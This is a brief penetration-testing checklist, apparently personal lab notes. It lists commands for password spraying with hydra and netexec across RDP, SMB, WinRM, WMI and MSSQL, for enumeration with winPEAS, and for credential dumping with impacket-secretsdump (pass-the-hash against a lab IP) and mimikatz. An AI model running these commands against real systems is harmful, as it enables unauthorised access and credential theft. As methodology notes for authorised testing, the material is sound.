# Penetration Test Checklist



## Web Application Testing



## Initial Compromise of Network

* [ ] nmap scan of internal network
* [ ] smb shares



## Harvested a New Credential&#x20;

### Spray Passwords

* ```shell-session
  $ hydra -l "yoshi" -p 'Mushroom!' -M ips.txt rdp
  ```
* ```shell-session
  $ netexec smb ips.txt -u users.txt -p passwords.txt 
  ```
* ```shell-session
  $ netexec winrm ips.txt -u users.txt -p passwords.txt
  ```
* <pre class="language-shell-session"><code class="lang-shell-session"><strong>$ netexec wmi ips.txt -u users.txt -p passwords.txt 
  </strong></code></pre>
* <pre><code><strong>$ netexec mssql ips.txt -u users.txt -p passwords.txt 
  </strong></code></pre>



## Popped a new Shell

#### Enumerate

* <pre><code><strong>$ .\winPEASx64.exe
  </strong></code></pre>

#### (PWNED) - Dump Secrets

* <pre class="language-shell"><code class="lang-shell"><strong>$ proxychains impacket-secretsdump -hashes ":e728ecbadfb02f51ce8eed753f3ff3fd" celia.almeda@10.10.85.142
  </strong></code></pre>
* ```powershell
  $ mimikatz
  ```

## Privilege Escalation

* [ ] PayloadAllTheThings&#x20;

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" %}

## Lateral Movement

*
